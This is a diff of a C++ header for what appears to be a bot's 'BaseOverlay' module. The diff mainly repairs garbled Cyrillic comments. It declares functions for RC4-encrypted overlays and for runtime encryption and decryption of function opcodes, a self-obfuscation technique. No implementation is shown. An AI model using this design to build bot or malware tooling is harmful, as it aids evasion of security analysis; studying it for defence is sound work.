@@ -1,5 +1,5 @@
 /*
-  Р‘Р°Р·РѕРІС‹Р№ РѕРІРµСЂР»РµР№ РґР»СЏ Р±РѕС‚Р°, Рё С„СѓРЅРєС†РёРё СЃРІСЏР·Р°РЅС‹Рµ СЃ РЅРёРј.
+  Базовый оверлей для бота, и функции связаные с ним.
 */
 #pragma once
 
@@ -12,68 +12,68 @@ namespace BaseOverlay
   };
   
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
   */
   void init(void);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    Р—Р°РіСЂСѓР·РєР° РѕРІРµСЂР»РµСЏ.
+    Загрузка оверлея.
 
-    OUT buffer         - Р±СѓС„РµСЂ РґР»СЏ РґР°РЅРЅС‹С… РѕРІРµСЂР»РµСЏ. Р”РѕР»Р¶РµРЅ Р±С‹С‚СЊ СЂР°Р·РјРµСЂРѕРј РЅРµ РјРµРЅРµРµ
+    OUT buffer         - буфер для данных оверлея. Должен быть размером не менее
                          FULL_SIZE_OF_OVERLAY.
-    IN overlay         - Р°РґСЂРµСЃ Р·Р°С€РёС„СЂРѕРІР°РЅРѕРіРѕ РѕРІРµСЂР»РµСЏ.
-    IN OUT overlaySize - РЅР° РІС…РѕРґРµ - СЂР°Р·РјРµСЂ overlay. РќР° РІС‹Р·С…РѕРґРµ - СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С… РѕРІРµСЂР»РµСЏ.
-    IN rc4Key          - РєР»СЋС‡ С€РёС„СЂРѕРІР°РЅРёСЏ. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
+    IN overlay         - адрес зашифрованого оверлея.
+    IN OUT overlaySize - на входе - размер overlay. На вызходе - размер данных оверлея.
+    IN rc4Key          - ключ шифрования. Может быть NULL.
 
-    Return             - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                         false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return             - true - в случаи успеха,
+                         false - в случаи ошибки.
   */
   bool _loadOverlay(void *buffer, const void *overlay, LPDWORD overlaySize, const Crypt::RC4KEY *rc4Key);
   
   /*
-    РЎРѕР·РґР°РЅРёРµ РѕРІРµСЂР»РµСЏ.
+    Создание оверлея.
 
-    OUT overlay - Р°РґСЂРµСЃ РїРѕ РєРѕС‚РѕСЂРѕРјСѓ Р±СѓРґРµС‚ Р·Р°РїРёСЃР°РЅ РѕРІРµСЂР»РµР№.
-    IN data     - РґР°РЅРЅС‹Рµ РѕРІРµСЂР»РµСЏ.
-    IN dataSize - СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С… РѕРІРµСЂР»РµСЏ.
-    IN rc4Key   - РєР»СЋС‡ С€РёС„СЂРѕРІР°РЅРёСЏ. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
+    OUT overlay - адрес по которому будет записан оверлей.
+    IN data     - данные оверлея.
+    IN dataSize - размер данных оверлея.
+    IN rc4Key   - ключ шифрования. Может быть NULL.
 
-    Return      - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                  false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return      - true - в случаи успеха,
+                  false - в случаи ошибки.
   */
   bool _createOverlay(void *overlay, const void *data, WORD dataSize, const Crypt::RC4KEY *rc4Key);
   
   /*
-    РџРѕР»СѓС‡РµРЅРёРµ Р°РґСЂРµСЃР° РѕРІРµСЂР»РµСЏ.
+    Получение адреса оверлея.
 
-    IN mem    - РґР°РЅРЅС‹Рµ, РІ РєРѕС‚РѕСЂС‹С… Р±СѓРґРµС‚ РїСЂРѕРёР·С…РІРѕРґРёС‚СЊСЃСЏ.
-    IN size   - СЂР°Р·РјРµСЂ mem.
-    IN rc4Key - РєР»СЋС‡ С€РёС„СЂРѕРІР°РЅРёСЏ. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
+    IN mem    - данные, в которых будет произхводиться.
+    IN size   - размер mem.
+    IN rc4Key - ключ шифрования. Может быть NULL.
     
-    Return    - Р°РґСЂРµСЃ РѕРІРµСЂР»РµСЏ, РёР»Рё NULL - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return    - адрес оверлея, или NULL - в случаи ошибки.
   */
   void *_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY *rc4Key);
 
   /*
-    Р”РµС€РёС„СЂРѕРІР°РЅРёРµ РѕРїРєРѕРґРѕРІ С„СѓРЅРєС†РёРё.
+    Дешифрование опкодов функции.
 
-    IN OUT curOpcode - РїРµСЂРІС‹Р№ РєСЂРёРїС‚РѕРІР°РЅРЅС‹Р№ РѕРїРєРѕРґ.
-    IN size          - РїРѕР»РЅРѕРµ РєРѕР». РєСЂРёРїС‚РѕРІР°РЅРЅС‹Р·С… Р±Р°Р№С‚.
-    IN key           - РєР»СЋС‡.
+    IN OUT curOpcode - первый криптованный опкод.
+    IN size          - полное кол. криптованнызх байт.
+    IN key           - ключ.
   */
   void _decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key);
 
-  /*Р’В Р’В Р’В Р’В Encryption opcodes up to the first meeting of RET.
+  /*В В В В Encryption opcodes up to the first meeting of RET.
 
-Р’В Р’В Р’В Р’В IN OUT curOpcode - a starting point.
-Р’В Р’В Р’В Р’В IN key - the key.
+В В В В IN OUT curOpcode - a starting point.
+В В В В IN key - the key.
 
-Р’В Р’В Р’В Р’В Return - zakriptovan number of bytes.
-Р’В Р’В */
+В В В В Return - zakriptovan number of bytes.
+В В */
   DWORD _encryptFunction(LPBYTE curOpcode, DWORD key);
 };
